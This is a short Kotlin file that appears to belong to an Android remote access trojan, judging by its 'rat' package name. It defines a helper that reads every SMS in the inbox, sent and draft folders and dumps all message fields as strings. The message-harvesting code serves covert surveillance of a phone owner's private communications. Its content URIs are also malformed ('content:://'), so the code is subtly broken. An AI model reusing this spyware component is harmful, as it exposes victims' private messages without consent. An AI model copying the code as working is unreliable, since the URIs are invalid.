package ru.awawa.rat.helper

import android.content.Context
import android.net.Uri

object SmsHelper {

    const val INBOX = "content:://sms/inbox"
    const val SENT = "content:://sms/sent"
    const val DRAFT = "content:://sms/DRAFT"

    fun readMessages(context: Context, source: String): Array<String> {
        val cursor = context.contentResolver.query(
            Uri.parse(source),
            null,
            null,
            null,
            null
        )

        if (cursor == null) {
            cursor?.close()
            return emptyArray()
        }

        val result = ArrayList<String>()
        if (cursor.moveToFirst()) {
            do {
                var msgData = ""
                for (idx in 0 until cursor.columnCount) {
                    msgData += " " + cursor.getColumnName(idx).toString() + ":" + cursor.getString(idx)
                }
                result.add(msgData)
            } while (cursor.moveToNext())
        }
        cursor.close()

        return result.toTypedArray()
    }
}